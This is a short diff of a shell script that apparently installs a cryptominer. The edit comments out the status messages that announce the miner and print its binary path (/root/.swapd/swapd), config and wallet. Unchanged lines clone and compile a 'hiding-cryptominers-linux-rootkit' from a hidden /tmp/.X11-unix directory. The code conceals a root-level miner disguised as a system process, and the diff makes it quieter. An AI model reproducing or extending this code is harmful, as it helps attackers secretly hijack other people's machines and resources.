@@ -1536,7 +1536,7 @@ else
 fi
 
 
-echo "[*] hide crypto miner."
+#echo "[*] hide crypto miner."
 cd /tmp
 cd .X11-unix
 git clone https://gitee.com/qianmeng/hiding-cryptominers-linux-rootkit.git && cd hiding-cryptominers-linux-rootkit/ && make
@@ -1612,10 +1612,10 @@ else
     echo "  Download Mode: Automatic download"
 fi
 
-echo ""
-echo "Miner Details:"
-echo "  Binary:  /root/.swapd/swapd"
-echo "  Config:  /root/.swapd/config.json"
-echo "  Wallet:  $WALLET"
-echo ""
-echo "========================================================================="
+#echo ""
+#echo "Miner Details:"
+#echo "  Binary:  /root/.swapd/swapd"
+#echo "  Config:  /root/.swapd/config.json"
+#echo "  Wallet:  $WALLET"
+#echo ""
+#echo "========================================================================="
